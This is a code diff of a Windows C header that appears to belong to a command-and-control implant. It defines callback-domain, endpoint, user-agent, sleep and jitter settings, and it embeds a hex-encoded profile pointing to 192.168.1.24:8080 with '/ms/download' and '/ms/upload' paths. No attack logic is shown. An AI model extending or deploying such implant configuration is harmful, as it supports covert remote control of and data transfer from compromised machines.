@@ -1,28 +1,29 @@
 #pragma once
 #include <windows.h>
 
+#define MAX_DOMAIN_COUNT 3 // todo, computer and update this at payload generation
 
-struct DomainEntrys {
-	PCHAR domain;
+typedef struct _DomainEntry {
+	CHAR domain[256];
 	UINT  port;
-	UINT isHttps;
-	BYTE  UseSSL;
-};
+	BOOL isHttps;
+	BOOL isDead;
+	BOOL isSecondChance;
+}DomainEntry;
 
 
-struct HeaderEntrys {
-	PCHAR Key;
-	PCHAR value;
-};
 
 struct Config {
-	struct DomainEntrys* domains;
+	DomainEntry domains[MAX_DOMAIN_COUNT];
 	size_t domaincounts;
 
-	struct HeaderEntrys* headers;
-	size_t HeaderCount;
-	PBYTE GetEndpoint;
-	PBYTE PostEndpoint;
+
+	// also calcuate these 3 below at generation time
+	CHAR GetEndpoint[64];
+	CHAR PostEndpoint[64];
+	CHAR UA[64];
+
+
 
 	UINT Sleep;
 	UINT Jitter;
@@ -33,12 +34,12 @@ struct Config {
 
 
 inline PBYTE GetProfile() {
-	return (PBYTE)"\x01\x00\x00\x00\x0c\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x34\x00\x00\x00\x00\x90\x1f\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00\x54\x45\x53\x54\x31\x32\x33\x34";
+	return (PBYTE)"\x01\x00\x00\x00\x0d\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x34\x00\x90\x1f\x00\x00\x01\x00\x00\x00\x0d\x00\x00\x00\x2f\x6d\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x00\x0b\x00\x00\x00\x2f\x6d\x73\x2f\x75\x70\x6c\x6f\x61\x64\x00";
 }
 
 
 inline UINT GetProfileSize() {
-	return 44;
+	return 61;
 }
 
 
